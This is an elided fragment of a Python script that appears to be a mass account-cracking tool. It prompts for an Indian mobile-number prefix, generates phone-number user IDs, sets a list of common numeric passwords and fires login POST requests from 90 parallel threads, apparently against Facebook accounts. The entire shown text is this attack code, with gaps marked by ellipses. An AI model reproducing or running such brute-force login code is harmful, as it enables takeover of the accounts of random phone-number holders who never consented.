...
def numb():
    ...
    print(n2)
    space()
    print("    [bold red]CODE               [bold yellow] ✓ [bold green]Example +91629, +91701, +91620 ")
    code=input("                        ✓ Choice ->")
    ...
    with ThreadPool (max_workers=90) as feel:
        ...
        for i in user:
            uid=code+i
            fb=tsg
            pwx=["57575751","57575752","57273200","59039200","07860786"]
            pwx=[]
...
'accept-language': 'en-IE,en-US;q=0.9,en;q=0.8'}
            ...
            session.post(url=url,data=info,headers=had).text
